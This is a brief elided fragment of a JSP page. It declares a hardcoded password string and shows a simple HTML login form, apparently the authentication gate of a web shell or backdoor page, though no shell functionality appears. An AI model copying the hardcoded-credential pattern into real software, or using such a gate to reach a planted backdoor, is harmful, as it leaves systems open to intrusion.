...
<%!
private String _password = "bugaosuni";
...
// -->
            ...
            <tr>
              <td height="30" align="center" class="td2" colspan="2">
                <input name="password" type="password" class="textbox" id="Textbox" value="error" />
                <input type="submit" name="Button" value="setting" id="Button" title="Click here to login" class="button" />
              </td>
            </tr>
          </form>
